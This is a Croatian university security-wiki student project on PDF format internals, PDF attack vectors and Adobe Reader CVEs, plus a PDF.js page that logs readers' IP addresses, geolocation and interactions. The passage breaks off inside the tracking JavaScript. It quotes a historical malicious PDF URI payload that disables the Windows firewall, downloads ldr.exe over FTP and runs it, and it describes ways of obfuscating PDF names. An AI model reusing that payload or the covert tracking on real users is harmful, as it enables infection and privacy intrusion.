<!DOCTYPE html>
<html lang="hr" dir="ltr">
<head>
<meta charset="UTF-8" />
<title>Označavanje i praćenje PDF-a - SIS Wiki</title>
<meta name="generator" content="MediaWiki 1.17.0" />
<link rel="shortcut icon" href="http://security.foi.hr/favicon.ico" />
<link rel="search" type="application/opensearchdescription+xml" href="../opensearch_desc.php" title="SIS Wiki (hr)" />
<link rel="EditURI" type="application/rsd+xml" href="../api.php%3Faction=rsd" />
<link title="Creative Commons" type="application/rdf+xml" href="http://security.foi.hr/wiki/index.php?title=Ozna%C4%8Davanje_i_pra%C4%87enje_PDF-a&amp;action=creativecommons" rel="meta" />
<link rel="copyright" href="http://creativecommons.org/licenses/by-sa/3.0/" />
<link rel="alternate" type="application/atom+xml" title="SIS Wiki Atom izvor" href="../index.php%3Ftitle=Posebno:Nedavne_promjene&amp;feed=atom" />
<link rel="stylesheet" href="../load.php%3Fdebug=false&amp;lang=hr&amp;modules=mediawiki.legacy.commonPrint%252Cshared%257Cskins.vector&amp;only=styles&amp;skin=vector&amp;*.css" />
<meta name="ResourceLoaderDynamicStyles" content="" />
<!--[if lt IE 7]><style type="text/css">body{behavior:url("/wiki/skins/vector/csshover.min.htc")}</style><![endif]--></head>
<body class="mediawiki ltr ns-0 ns-subject page-Označavanje_i_praćenje_PDF-a skin-vector">
		<div id="mw-page-base" class="noprint"></div>
		<div id="mw-head-base" class="noprint"></div>
		<!-- content -->
		<div id="content">
			<a id="top"></a>
			<div id="mw-js-message" style="display:none;"></div>
						<!-- firstHeading -->
			<h1 id="firstHeading" class="firstHeading">Označavanje i praćenje PDF-a</h1>
			<!-- /firstHeading -->
			<!-- bodyContent -->
			<div id="bodyContent">
				<!-- tagline -->
				<div id="siteSub">Izvor: SIS Wiki</div>
				<!-- /tagline -->
				<!-- subtitle -->
				<div id="contentSub"></div>
				<!-- /subtitle -->
																<!-- jumpto -->
				<div id="jump-to-nav">
					Skoči na: <a href="Označavanje_i_praćenje_PDF-a.html#mw-head">orijentacija</a>,
					<a href="Označavanje_i_praćenje_PDF-a.html#p-search">traži</a>
				</div>
				<!-- /jumpto -->
								<!-- bodytext -->
				<p>Student: Dino Kliček 
</p><p><br />
</p>
<table id="toc" class="toc"><tr><td><div id="toctitle"><h2>Sadržaj</h2></div>
<ul>
<li class="toclevel-1 tocsection-1"><a href="Označavanje_i_praćenje_PDF-a.html#PDF_format"><span class="tocnumber">1</span> <span class="toctext">PDF format</span></a>
<ul>
<li class="toclevel-2 tocsection-2"><a href="Označavanje_i_praćenje_PDF-a.html#Sintaksa_PDF-a"><span class="tocnumber">1.1</span> <span class="toctext">Sintaksa PDF-a</span></a></li>
<li class="toclevel-2 tocsection-3"><a href="Označavanje_i_praćenje_PDF-a.html#PDF_akcije_i_filtri"><span class="tocnumber">1.2</span> <span class="toctext">PDF akcije i filtri</span></a></li>
</ul>
</li>
<li class="toclevel-1 tocsection-4"><a href="Označavanje_i_praćenje_PDF-a.html#Ranjivosti_PDF-a"><span class="tocnumber">2</span> <span class="toctext">Ranjivosti PDF-a</span></a>
<ul>
<li class="toclevel-2 tocsection-5"><a href="Označavanje_i_praćenje_PDF-a.html#Podaci_o_ranjivosti"><span class="tocnumber">2.1</span> <span class="toctext">Podaci o ranjivosti</span></a></li>
</ul>
</li>
<li class="toclevel-1 tocsection-6"><a href="Označavanje_i_praćenje_PDF-a.html#Pra.C4.87enje_interakcija_korisnika_u_PDF-u"><span class="tocnumber">3</span> <span class="toctext">Praćenje interakcija korisnika u PDF-u</span></a>
<ul>
<li class="toclevel-2 tocsection-7"><a href="Označavanje_i_praćenje_PDF-a.html#PDF.js_projekt"><span class="tocnumber">3.1</span> <span class="toctext">PDF.js projekt</span></a></li>
<li class="toclevel-2 tocsection-8"><a href="Označavanje_i_praćenje_PDF-a.html#Prakti.C4.8Dni_dio_projekta"><span class="tocnumber">3.2</span> <span class="toctext">Praktični dio projekta</span></a></li>
<li class="toclevel-2 tocsection-9"><a href="Označavanje_i_praćenje_PDF-a.html#Acrobat_Javacript_kao_vektor_napada"><span class="tocnumber">3.3</span> <span class="toctext">Acrobat Javacript kao vektor napada</span></a>
<ul>
<li class="toclevel-3 tocsection-10"><a href="Označavanje_i_praćenje_PDF-a.html#Mjere_za.C5.A1tite_od_malicioznih_PDF-ova"><span class="tocnumber">3.3.1</span> <span class="toctext">Mjere zaštite od malicioznih PDF-ova</span></a></li>
</ul>
</li>
</ul>
</li>
<li class="toclevel-1 tocsection-11"><a href="Označavanje_i_praćenje_PDF-a.html#Zaklju.C4.8Dak"><span class="tocnumber">4</span> <span class="toctext">Zaključak</span></a></li>
<li class="toclevel-1 tocsection-12"><a href="Označavanje_i_praćenje_PDF-a.html#Literatura"><span class="tocnumber">5</span> <span class="toctext">Literatura</span></a></li>
</ul>
</td></tr></table>
<h2> <span class="mw-headline" id="PDF_format"> PDF format </span></h2>
<p><a href="http://security.foi.hr/wiki/index.php/Datoteka:PDFicon.png" class="image"><img alt="PDFicon.png" src="../images/a/ac/PDFicon.png" width="64" height="64" /></a>
</p><p>Portable Document Format ili poznatiji kao PDF format je oblik zapisa dokumenata koji omogućava pouzadano prikazivanje podataka i razmjenu takve vrste dokumenta između osoba neovisno o njihovom softveru, hardveru ili operacijskom sustavu. PDF je kreirao Adobe Systems 1993. godine, a od 2008. godine PDF je postao otvoreni standard objavljen od svjetske organizacije za standardizaciju ISO (ISO/IEC 32000-1:2008), dok je do tad Adobe posjedovao njegovu specifikaciju. Upravo ta popularnost i velik broj otkrivenih ranjivosti u softveru i propusta u samom jeziku kojeg PDF koristi za prikaz dokumenata, pogodovali su razvoju zloćudnog softvera koji koristi taj format. [1]
</p><p>Većina računalnih korisnika razumije PDF datoteku kao jednostavan način razmjene dokumenata, no upotreba PDF-a je raznovrsna i  interaktivnija između korisnika i samog dokumenta. PDF dokument sadrži kompletan opis, uključujući tekst, slike, vektorsku grafiku, rasterske slike, a može sadržavati i interaktivnu grafiku u 2D i 3D prostoru. Način na koji PDF format definira grafiku vrlo je sličan jeziku PostScript, a koristi Kartezijev
koordinatni sustav, koji je neovisan o korištenoj platformi, za opis površine stranice. [4] Također, format je prvenstveno zamišljen da simulira oblik knjige, te svojim izgledom predstavlja digitalni oblik knjige. Korištenje PDF dokumenata, odnosno pojedinih funkcionalnosti takvog formata često se koristi kao vektor napada jer PDF dokument može sadržavati različite vrste tereta, uključujući viruse i trojance koji se mogu koristiti za infiltriranje u organizacije i postati prijetnja njihovoj imovini.[3] 
</p><p>Tvrtka Adobe, kao izumitelj i bivši vlasnik specifikacija PDF-a je najzastupljenija na tržištu alata. Njeni aktualni alati su (počevši od onog sa najmanje mogućnosti): Reader 9, Acrobat Standard 9, Acrobat Pro, Acrobat Pro Extended dok postoje i ostali popularni alati: Ostali popularni alati: Foxit Reader i ostali alati iste tvrtke, Evince, Sumatra PDF, Nitro PDF i drugi.
</p>
<h3> <span class="mw-headline" id="Sintaksa_PDF-a"> Sintaksa PDF-a </span></h3>
<p>PDF dokument je zapravo podatkovna datoteka sastavljena od objekata koji mogu biti statične ili interaktivne prirode. Poredak tih objekata nije važan što PDF dokumentima daje određenu fleksibilnost. Svi ti objekti moraju biti povezani preko  povratne reference (cross reference table) koja se uvijek nalazi na pri kraju PDF dokumenta. Sva ažuriranja dokumenta i bilo kakve izmjene u njemu se zapisuju na kraj dokumenta tako da se originalna verzija sačuva u potpunosti. Dakle, dodaju se dodatni objekti dokumentu, dok se referentna tablica se ažurira kako bi se promjena vidjela. Također, kod brisanja objekata, odabrani objekti se brišu iz referentne tablice, ali se ne uklanjaju iz dokumenta. PDF
objekti mogu definirati okidače koji reagiraju i pokreću akcije kada korisnik pritisne određenu
tipku na tipkovnici ili mišu itd. 
</p><p>Na sljedećim slikama može se vidjeti izgled strukture PDF dokumenta koja je podijeljena na četiri komponente [4].
</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:PDFStructure3.png" class="image"><img alt="PDFStructure3.png" src="../images/5/51/PDFStructure3.png" width="384" height="384" /></a>[2]     <a href="http://security.foi.hr/wiki/index.php/Datoteka:PDFStructure4.png" class="image"><img alt="PDFStructure4.png" src="../images/2/2b/PDFStructure4.png" width="447" height="292" /></a> [2]  <a href="http://security.foi.hr/wiki/index.php/Datoteka:RodDijet.png" class="image"><img alt="RodDijet.png" src="../images/e/e3/RodDijet.png" width="225" height="242" /></a>
</p><p>Kratki opis svake komponente PDF-a:
</p><p>1) <b>Header</b> - nalazi se na početku dokumenta gdje oznaka&#160;%pdf-1.x označuje verziju PDF-a.
</p><p>2) <b>Body</b> - sadrži sve objekte u kojima su zapisane informacije o korištenom fontu, slikama te naposljetku i riječima. Svaki objekt je definiran oblikom:
<i>objNbr verNbr obj</i>
&lt;&lt; (object contents) &gt;&gt;
endobj
gdje je [objNbr] – redni broj objekta, verNbr identifikator verzije objekta koji sa objnum čini jedinstvenu oznaku objekta kojim se može referencirati. Nadalje obj, endobj su ključne riječi, a u objekt se mogu stavljati vrijednosti poput vrste fonta, akcije itd. Objekti su u hijerarhijskom odnosu roditelj-djeca.
</p><p>3) <b>Xref</b> - ili povratna reference služi za upravljanje i povezivanje objekata unutar PDF-a. Svaka linija unutar xref tablice odgovara objektu u datoteci i označava pomak u bajtovima od početka datoteke do mjesta gdje se objekt nalazi. Moguće je postojanje više xref tablica prema dizajnu tako da se kasnije PDF datoteke mogu ažurirati.
</p><p>4) <b>Trailer</b> - PDF dokument sadrži završni dio sa oznakom&#160;%% EOF koja ukazuje na povratnu referencu i na objekt korijena kako bi se izvršilo renderiranje da bi podaci PDF-a bili vidljivi.
</p>
<h3> <span class="mw-headline" id="PDF_akcije_i_filtri"> PDF akcije i filtri </span></h3>
<p>Specifikacija PDF jezika mnogo je složenija nego što se misli. Od nastanka, sa svakom novom verzijom, Adobe je dodavao nove mogućnosti. Posljednja inačica PDF-a je 1.7. Od verzije 1.3 u PDF je uvedena mogućnost dodavanja JavaScript koda. Tako se JavaScript kodom može utjecati na izgled stranica, podatke u poljima, na forme. Uz to, na izvršavanje koda može utjecati i neka akcija korisnika npr. otvaranje dokumenta i slično.
</p><p>U prethodnom tekstu bilo je posmenuto da objekti mogu imati i izvodi razne akcije, a najznačajniji su [2]:
</p><p><i>/Goto or /GotoR</i> - idi na definiranu stranicu u dokumentu
</p><p><i>/Launch</i> - izvrši komandnu liniju, ukinuto od verzije 9.3.3. kako bi se spriječilo otvaranje /Launch cmd.exe
</p><p><i>/JavaScript</i> - izvrši javascript kod
</p><p><i>/Hide</i> - skrivanje/otkrivanje poruka
</p><p><i>/URI</i> - spoji se na dani URI
</p><p>Hakeri često koriste akcije <i>/Launch</i> i <i>/JavaScript</i> za izvršavanje napada putem PDF datoteka. Isto tako, važno je spomenuti da PDF dokumenti omogućuju sadržavanje i binarnog sadržaja koji se može iskoristiti za skrivanje payloada PDF dokumenta koristeći se jednim od sljedećih flitara [2]: ASCIIHexDecode, ASCII85Decode, LZWDecode, FlateDecode, CCTTFaxDecode, JBIG2Decode, DCTDecode, JPXDecode.  Svaki znak može se napisati heksadecimalnim ASCII kodom tako da npr. /Java#53cript je isto što i /JavaScript. Dakle, vidljivo je da su pravila za leksičko izražavanje u PDF-u vrlo su labava čime se stvara mogućnost napadačima da prikriju zloćudni kod jer je time izbjeći detekciju antivirusnim programima ili sustavima za detekciju upada.
</p>
<h2> <span class="mw-headline" id="Ranjivosti_PDF-a"> Ranjivosti PDF-a </span></h2>
<p>Kao što se da naslutiti PDF nije samo oblik dokumenta, već je programski jezik koji se koristi za izradu i manipulaciju dokumenata. PDF podržava značajke izvršenja koje su dizajnirane za interakciju s dokumentima. Na primjer, PDF datoteka može se koristiti kao interaktivni obrazac gdje se podaci mogu poslati natrag na neku udaljenu web stranicu i slično. Međutim, u novije vrijeme PDF preglednici, kao što su Adobe Acrobat i Foxit, podržavaju dodatne funkcionalnosti kao što su izvršavanje JavaScript, Flash i ActiveX. Također, PDF datoteke mogu se pregledavati u preglednicima Interneta pomoću dodataka (plug-ins) kao što postoji dodatak preglednika za Adobe Acrobat Reader. Ovo uvodi nove napadačke vektore, kao što su ranjivosti cross-site scripting, kod kojih napadač injektira kod JavaScripta, VBScript ili čak HTML-a u web preglednik žrtve, a koji se zatim izvršava lokalno na žrtvinom računalu.
</p><p>Ako se PDF datoteke pregledavaju u memoriji unutar internetskog preglednika, to znači da datoteka nije pohranjena na računalo žrtve, a što zapravo smanjuje vjerojatnost da će žrtva saznati da je zaražena, odnosno čita zaraženi PDF. Na primjer, privlačenjem žrtve da dođe na zlonamjerne web stranice može rezultirati izvršavanjem JavaScript-a PDF-a u pregledniku žrtve, gdje napadač dobiva informacije o trenutnoj sesiji, odnosno informaciju s na kojoj se stranici žrtva još nalazi. To bi moglo omogućiti napadaču lažno predstavljanje žrtvi ili pak dobivanje njezinih osjetljivih informacija. Dakle, JavaScript je glavni izvor za ranjivosti u PDF datotekama.
</p><p>Međutim, postoje ranjivosti koje nisu vezane uz JavaScript. Na primjer /Launch akcija je naredba PDF-a koja omogućuje pokretanje bilo koje izvršne datoteke na računalu korisnika. Naime, spomenuta akcija Launch, kako je tako definirano u specifikaciji PDF-a, koristi ShellExecute funkciju operativnog sustava Windows. Adobe Reader pri pokretanju takve naredbe upozorava korisnika i pita ga je li siguran da to želi, no ta se poruka može izmijeniti i korištenjem socijalnog inženjeringa navesti korisnika da potvrdi akciju. To se može koristiti za izvršavanje naredbene ljuske ili drugog zlonamjernog koda itd. Stoga isključivanje JavaScript u PDF Readeru ne štiti od svih iskorištavanja. [4] Postoje i PDF eksploiti koji ne zahtijevaju od korisnika da otvori PDF datoteku. Zlonamjerni kôd može se izvršiti i kada korisnik prebaci miš iznad datoteke, pogleda sličicu ili odabere datoteku.
</p><p>Adobe Reader dolazi sa dodacima (pluginovima) koji proširuju funkcije Reader-a. Takve dodatke mogu razviti i treće strane čime se ponovno javlja mogućnost propusta. Dodaci se mogu pronaći u subdirektorijima od Readera, a svi imaju proširenje *.api (obične DLL datoteke preko kojih su također zabilježeni ranjivosti što je dalo mogućnost napada).
</p><p>Najčešći vektori napada na PDF dokument koji se javljaju prikazan je na sljedećoj slici. 
</p>
<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Screenshot_2018-01-17_17.52.34.png" class="image"><img alt="Screenshot 2018-01-17 17.52.34.png" src="../images/b/bf/Screenshot_2018-01-17_17.52.34.png" width="835" height="527" /></a></div></div>
<p><i>Vlastita izrada prema dostupnim podacima iz literature</i>
</p><p>Iz svega navedenog vidimo kako jezik PDF-a ima u svojim temeljima neke ranjivosti, tako da je moguće proizvesti zloćudni kod koji koristi ranjivost jezika, a ne softversku ranjivost, što može biti vrlo opasno. Druga bitna stvar je iznimno velika zastupljenost PDF datoteka na Web stranicama i to tako da se one automatski pokreću unutar Web preglednika. Ovo može biti jako opasno, posebno ako korisnik nema dovoljno dobro podešenu sigurnost unutar Web preglednika i slijepo vjeruje bilo kakvom sadržaju.
</p><p>JavaScript koji podržava Adobe Reader / Acrobat je prirodan u svakom PDF dokumentu. Iako ima drugačije sučelje i programske funkcije u usporedbi s JavaScriptom podržanim od strane web preglednika također podržava i manje funkcionalnosti u usporedbi s onima u web preglednicima. No, svejedno je i dalje jako oružje hakera u cyber kriminalu. Javascript u PDF u dokumentu, ukoliko je uključen u postavkama (po defaultu jest), djeluje na jednosj od dvije razine povlastica u sigurnosnom kontekstu. Razine su:
</p><p><b>Neprivilegirani kontekst</b> - zadani način rada po default postavkama za bilo koji ugrađeni JavaScript u PDF-u. U ovom se kontekstu mogu koristiti samo one javascript operacije koje se odnose na strukturu dokumenta ili na manipuliranje podatkovnim poljima u obrascima.
</p><p><b>Povlašteni kontekst</b> - ova razina konteksta omogućuje više potencijalno opasnih javascript funkcija kao što su na primjer prilagođeni HTTP zahtjevi. To je moguće učiniti ako se neka funkcija prosljedi kao parametar u <i>app.trustedFunction</i> funkciji.
</p><p>Adobe Acrobat Reader koristi crnu i bijelu listu dopuštenih mrežnih veza. Dakle, pojedini URL-ovi mogu biti dopušteni ili odbijeni. Prema defaultnim postavkama svi URL-ovi koji se ne nalaze na popisu crne liste ili na bijeloj listi zahtijevaju od korisnika dozvolu za mrežni pristupa određenom URL-u. Međutim, korisnik može to promijeniti u postavkama Upravljanje pouzdanošću. Crni popis i popis dopuštenih listova pohranjeni su u registru MS Windows na mjestu [1]:
HKCU \ Software \ Adobe \ &lt;Softver&gt; \ &lt;Verzija&gt; \ TrustManager \ cDefaultLaunch URLPerms \ tHostPerms
Te će postavke omogućiti nadzor nad svakim pokušajem pristupa udaljenoj web-lokaciji, uključujući funkciju app.launchURL ili getURL u JavaScriptu koja pristupa danom URL-u. Valja imati na umu da se na tim URL-ovima ne vrši razlučivanje imena URL-ova, stoga se web-lokacija <a href="http://www.evilhacker.com" class="external free" rel="nofollow">http://www.evilhacker.com</a> može blokirati, no ipak joj se može pristupiti putem vlastite IP adrese ako to nije blokirano preko firewall-a. 
</p><p>Većina napada usmjerena je prema tome da se, kad korisnik otvori zloćudni PDF, pokrene ugrađeni javascript kod koji se poveže na Internet, odnosno na neki landing page koji sadržava exploite koji provjere koju verziju browsera ili plugina korisnik koristi, a zatim ga dalje preusmjere na onu stranicu koja može iskoristiti određeni exploit kako bi zaobišao zaštite koje ima preglednik te u konačnici skinu i pokrenu malware, što se sve odvija u pozadini nevidljivo. Prethodno ispričano može se vidjeti na sljedećoj slici.
</p>
<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Embbededjs.png" class="image"><img alt="Embbededjs.png" src="../images/thumb/b/bd/Embbededjs.png/600px-Embbededjs.png" width="600" height="364" /></a></div></div>
<p>Neki od najznačajnijih ranjivosti pronađenih u JavaScipt funkcijijama unutar Adobe Reader-a su:
</p><p>Doc.media.newPlayer() - CVE-2009-4324
</p><p>Collab.getIcon() - CVE-2009-0927
</p><p>util.printf() - CVE-2008-2992
</p><p>Collab.collectEmail.Info() - CVE-2007-5659.
</p><p>Koristeći se Metasploitom, moćnim alatom koji pruža različite načine napada, ali isto tako načine za poduzimanje sigurnosnih mjera za ranjive sustave, možemo vidjeti neke od exploita Adobe PDf-a upisjujući naredbu: <i>search type:exploit platform:windows adobe pdf</i>. Na sljedećoj slici se može vidjeti nekolicina exploita vezana uz Adobe zajedno s imenom, rangom, datumom otkrivanja i opisom svakog eksploita. Metasploit time olakšava napade hakerima jer za svaki eksploit prikazuje sve dostupne opcije i oni su u mogućnosti da shvate koji exploit je najbolje koristiti za napad.
</p>
<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:MetasploitPDF.png" class="image"><img alt="MetasploitPDF.png" src="../images/3/3e/MetasploitPDF.png" width="1152" height="1198" /></a></div></div>
<h3> <span class="mw-headline" id="Podaci_o_ranjivosti"> Podaci o ranjivosti </span></h3>
<p>Prema dostupnim podacima prikazanim na sljedećoj slici vidljivo je da izvršavanje koda primarna ranjivost Adobe Acrobat Readera koa najčešće korištenog alata za čitanje i uređivanje PDF datoteka. Također, velika ranjivost predstavlja i Overflow što ponajprije omogućuje Javascript. PDF jest plodno tlo za svoje zlonamjerne radnje i što dokazuje da je velik broj otkrivenih ranjivosti pogodovao većom iskorištavanju istih, no valja spomenuti da je izdan jako velik broj zakrpa kojima se sprječavaju napadi. 
</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:PDFRanjStats.png" class="image"><img alt="PDFRanjStats.png" src="../images/b/be/PDFRanjStats.png" width="961" height="343" /></a>
</p><p><a href="https://www.cvedetails.com/product/497/Adobe-Acrobat-Reader.html?vendor_id=53" class="external text" rel="nofollow">Izvor.</a>
</p><p>Dakle, većina napada usmjerena je prema tome da se, kad korisnik otvori zloćudni PDF, pokrene novi proces, odnosno trojanski konj koji tako zarazi korisnikovo računalo. U srpnju 2007. godine zabilježeno je da napadači šire neželjene poruke elektroničke pošte (spam) s PDF dokumentima u privitku koji koriste tehnike zaštite PDF formata (enkripciju) kako bi otežali anti-virusnim alatima detekciju zloćudnog koda. U rujnu 2007. godine otkrivena je ranjivost alata Adobe Reader i Acrobat koji je omogućavao zloćudnom kodu da isključi Windows firewall, FTP-om preuzme crva i onda ga pokrene. Zloćudni PDF se širio e-mailom u privitku i bilo ga je dovoljno otvoriti da biste se zarazili. Zloćudni kod je sadržavao obj tag te je izgledao ovako:
</p><p><i>obj&lt;&lt;/URI(mailto&#160;:%/../../../../ ../../Windows /system32/cmd".exe"" /c /q \"@echo</i>
off&amp;netsh firewall set opmode mode=disable&amp;echo o 1. 2. 3.4&gt;1&amp;echo binary&gt;&gt;1&amp;echo
get /ldr.exe&gt;&gt;1&amp;echo quit&gt;&gt;1&amp;ftp -s:1 -v -A&gt;nul&amp;del /q 1&amp; start ldr.exe&amp;\" \"&amp;\"
"nul.bat)/S/ URI&gt;
</p><p>Krajem 2009. pojavila se naprednija vrsta zloćudnog PDF dokumenta istog tipa koji je koristio ranije zabilježenu ranjivost koristeći zloćudni JavaScript kod. Kao i mnoge ranije zloupotrebe tog tipa koristio je tehniku pretrpavanja memorije (overflow) kako bi se kod izvršio točno na određenom dijelu memorije. To se izvodilo gomilanjem NOP (No OPeration) naredbi procesoru, a riječ je bilo o nizu instrukcija koje imaju istu funkciju. Kod za pristup ljusci podijeljen je na dvije razine, što ovaj slučaj čini naprednijim od drugih. Naime, drugi dio koda je spremljen u drugom objektu, potpuno neovisno o prvom dijelu i on se izvršava (i postavlja u memoriju) iako dekompresija dokumenta ne uspijeva jer je PDF kod pogrešan. Tada, prvi dio koda pronalazi drugi dio u memoriji i prepušta mu daljnje izvođenje. Nakon toga, kod obrađuje ime PDF datoteke iz komandne linije i otvara je direktno, a sve zbog toga što ta PDF datoteka u sebi ima skrivene dvije izvršne datoteke (.exe). Prva pokušava dohvatiti zloćudni sadržaj sa mreže, dok druga otvara zloćudnu datoteku baby.pdf, kako korisnik ne bi primijetio da mu se prethodno srušio Adobe Reader. Na ovaj način napadač dobije potpunu kontrolu nad računalom korisnika. 
</p><p>U travnju 2010. pojavio se zloćudni PDF dokument koji je u sebi sadržavao učahureni objekt kodiran korištenjem filtera Flatedecode i ASCII85Decode, a taj je objekt zapravo predstavljao XML datoteku koja u sebi nosi zloćudnu datoteku formata TIFF (Tagged Image File Format). Malver je koristio dvije ranjivosti PDF-a: jednu vezanu uz JavaScript i drugu uz TIFF. U lipnju 2010. zabilježeno je kako napadači koriste ranjivost authplay.dll datoteke koja dolazi uz svaku kopiju alata Adobe Reader i Acrobat te predstavlja prevoditelja za Adobe Flash sadržaj u PDF dokumentima. Napadači su u PDF dokumente postavljali zloćudni Flash sadržaj. Propust je pogađao verzije 9 Adobeovih alata i to na operativnim sustavima Windows, Linux i Solaris. Ovaj propust su sigurnosne tvrtke kao Secunia ocijenile ekstremno kritičnim jer napadaču dozvoljava da preuzme kontrolu nad računalom napadnutog.[2]
</p>
<h2> <span class="mw-headline" id="Pra.C4.87enje_interakcija_korisnika_u_PDF-u"> Praćenje interakcija korisnika u PDF-u </span></h2>
<p>PDF dokumenti imaju veliku svestranost s obzirom da se mogu prikazati unutar pojedinih čitača PDF dokumenta, ali i unutar web preglednika. Ovaj projekt posvećen je praćenju korisnikove interakcije unutar PDF-a prikazanog u web pregledniku i prikazu svih prikupljenih podataka vlasniku PDF dokumenta. Dakle, svaki puta kada netko otvori PDF u svojem pregledniku skupljaju se podaci poput datuma i vremena čitanja, IP adresa čitatelja, geolokacija te naravno sve učinjene interakcije u PDF dokumentu. Kod izrade ovog praktičnog dijela koristio sam se dostupnim 000webhosting serverom na kojem je stavljen PDF dokument, a također sam koristio PDF.js za otvaranje i čitanje PDF-a online. Razlog zašto je bolje i jednostavnije pratiti korisnike preko web preglednika jest taj da PDF dokumenti su danas dosta paranoični kod otvaranja i izvršavanja Javacript koda u sebi zahvaljujući svim mogućim dosadašnjim zakrpama. Važno je imati na umu da JavaScript objekti, funkcije i svojstva koje pruža Adobe JavaScript razlikuju se od onih koje pruža web preglednik. Acrobat JavaScript nema pristup objektima unutar HTML stranice. Slično tome, HTML JavaScript ne može pristupiti objektima unutar PDF datoteke zbog čega je otežana i dosta neefikasno praćenje interakcija korisnika.
</p>
<h3> <span class="mw-headline" id="PDF.js_projekt"> PDF.js projekt </span></h3>
<p>PDF.js je Javascript biblioteka namijenjena za prikazivanje PDF dokumenata pomoću HTML5 canvasa što znači da se može koristiti u modernim preglednicima bez instaliranja dodataka treće strane. Projekt izrade je pokrenula Mozilla sa načelom Andreas Galom koji je pokrenuo cjelokupni eksperiment u 2011. godini. PDF.js može funkcionirati kao dio web stranice (što je bio slučaj u ovom projektu) ili web preglednika. PDF.js već je u upotrebi na mnogim različitim mjestima, uključujući neka za online dijeljenje datoteka kao što su Dropbox, CloudUp i Jumpshare te je tamo inplementiran kako bi korisnicima omogućio pregled PDF dokumenata online bez skidanja.
</p><p>PDF.js kao biblioteka sastoji se od niz javascript datoteka od kojih su pdf.js i pdf.worker.js najvažnije za ispravno funkcioniranje, odnosno prikazivanje PDF dokumenta. Zapravo, ono što se događa je parsiranje PDF datoteke koristeći se HTML5 canvasom što zapravo daje kao output browseru HTML, a ne PDF. To je ključno jer dostupne .html datoteke unutar PDF.js omogućavaju praćenje korisnikovih interakcija. Jedna od datoteka jest <i>viewer.js</i> gdje se promatranjem javascript koda može vidjeti niz eventova koji se koriste kod prikaza PDF-a.
</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:ViewerEvents.png" class="image"><img alt="ViewerEvents.png" src="../images/thumb/8/8c/ViewerEvents.png/500px-ViewerEvents.png" width="500" height="547" /></a> <a href="http://security.foi.hr/wiki/index.php/Datoteka:ViwerElem.png" class="image"><img alt="ViwerElem.png" src="../images/5/5f/ViwerElem.png" width="1042" height="596" /></a>
</p><p>Dakle, može se vidjeti korištenje event bus-a kao sabirnice svih eventova koja omogućuje da umjesto izravnog komuniciranja s drugim objektima na stranici, svaki objekt komunicira s ovim središnjim sustavom za upravljanje događajima. Također su vidljivi ID elemenata nad kojima se pozivaju eventi, a koji će kasnije poslužiti za izradu koda za praćenje interakcija. Važno mi je bilo dobro proučiti cjelokupni kod i shvatiti kako i na koji način se eventovi pozivaju. 
</p><p><a href="https://mozilla.github.io/pdf.js/" class="external text" rel="nofollow">PDF.js</a>
</p>
<h3> <span class="mw-headline" id="Prakti.C4.8Dni_dio_projekta"> Praktični dio projekta </span></h3>
<p>Kako bi pratio interakciju korisnika prvo je bilo potrebno pronaći odgovarajući web hosting, u mojem slučaju <i>000webhost</i>, koji omogućava izravno pisanje PHP-a na serveru. <a href="https://sispdfproject.000webhostapp.com/" class="external text" rel="nofollow">Web mjesto PDF dokumenta za praćenje.</a> Hosting je dosta jednostavan i što je najbitnije omogućava jednostavan upload drugih datoteka za izradu web stranice. Stoga, PDF.js library, odnosno sve datoteke vezane uz PDF.js se lako implementiraju na server. Izgled stranice nalazi se na sljedećoj slici.
</p>
<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:PocetnaPDF.png" class="image"><img alt="PocetnaPDF.png" src="../images/5/5e/PocetnaPDF.png" width="1440" height="142" /></a></div></div> 
<p>Na početnom linku stavljen je gumb <i>Izvor znanja</i> koji se referencira sa sljedeći način:
<i>&lt;a href=/web/viewer.html?file=isoSIS.pdf target=_blank onclick="&lt;?php include_once("logs.php");&#160;?&gt;"&gt;Izvor znanja&lt;/a&gt;</i>
</p><p>Pritiskom na taj link otvara se PDF dokument nazvan <i>isoSIS.pdf</i>. Svi korisnici iako imaju instaliran Adobe plugin, Google ili neki drugi za čitanje PDF dokumenta online će vidjeti ovakvu alatnu traku označenu crvenom bojom na sljedećoj slici. Sasvim normalna traka koja posjeduje razne uobičajene funkcije za manipuliranje PDF dokumentom. 
</p>
<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:PocetnaPDF2.png" class="image"><img alt="PocetnaPDF2.png" src="../images/0/09/PocetnaPDF2.png" width="1434" height="613" /></a></div></div> 
<p>Važno je da se korisnik preusmjeri na viewer.html datoteku (vidljivo u url preglednika) koja omogućuje prikaz PDF datoteke zahvaljujući PDF.js-u. Viewer.html datoteka u sebi sadržava <i>&lt;script src="viewer.js"&gt;&lt;/script&gt;</i> čiji dijelovi koda su vidljivi na slici u PDF.js dijelu teksta, a zapravo je temelj za praćenje korisnikove interakcije unutar dokumenta. Naravno, viwer.html datoteka također sadržava <i>&lt;script src="pdfPracenje.js"&gt;&lt;/script&gt;</i>. Datoteka pdfPracenje.js zadužena je za slušanje određenih događaja, odnosno eventova koje korisnik pokreće u PDF dokumentu, a javascript kod  je sljedeći: <a href="https://codeshare.io/5OBLXr" class="external text" rel="nofollow">PROGRAMSKI KOD</a>
</p>
<pre>
(function(){
  var sveInterakcije = &quot;&quot;;
  'use strict';
  var doc = 'pdfdefault',
    download = document.getElementById('download'),
    secDownload = document.getElementById('secondaryDownload'),
    print = document.getElementById('print'),
    secPrint = document.getElementById('secondaryPrint'),
    zoomIn = document.getElementById('zoomIn'),
    zoomOut = document.getElementById('zoomOut'),
    presentationMode = document.getElementById('presentationMode'),
    secPresentationMode = document.getElementById('secondaryPresentationMode'),
    pageRotateCw = document.getElementById('pageRotateCw'),
    pageRotateCcw = document.getElementById('pageRotateCcw'),
    findField = document.getElementById('findInput');

  if (window.location.search) {
    doc = window.location.search.split('=')[1];
  }
  /**
   * Prati ako se pagechange
   */
  window.addEventListener('pagechange', function pagechange(evt) {
    window.trackInteraction(doc, 'page-'+evt.pageNumber);
    var str = 'page-'+evt.pageNumber +&quot; &quot;;
    sveInterakcije = sveInterakcije + str + &quot;\n&quot;;
